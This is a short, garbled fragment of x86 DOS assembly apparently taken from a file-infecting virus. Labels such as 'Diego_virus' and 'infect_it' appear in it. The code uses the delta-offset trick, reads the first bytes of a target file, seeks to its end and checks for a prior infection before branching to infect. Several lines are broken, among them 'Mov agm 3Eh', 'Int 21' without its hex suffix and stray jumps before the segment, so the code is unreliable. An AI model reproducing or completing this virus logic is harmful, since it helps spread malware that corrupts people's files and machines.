	JE READ
	JNE Diego_virus

codigo segment 'code'

	org 100h 

	assume cs:codigo,ds:codigo,es:codigo
	
start proc far
START:
	push cs
	push cs
	
	pop ds	
	pop es
	
	call falso_proc

falso_proc 	proc near
falso_proc  endp

	pop bp
	sub bp, 107h
	
	mov ah, 3Fh ;Read first three
mov 	cx, 3 ;bytes of the file
lea	dx, [bp+offset buffer] ;to the buffer
int 	21h
mov 	ax, 4202h ;SEEK from EOF
xor 	cx, cx ;DX:CX = offset
xor 	dx, dx ;Returns filesize
int 	21h ;in DX:AX
Sub 	ax, virus_size + 3
cmp 	word ptr [bp+offset buffer+1], ax
jnz 	infect_it
bomb_out:
Mov 	agm 3Eh ;else close the file
Int 	21 ; and go find another
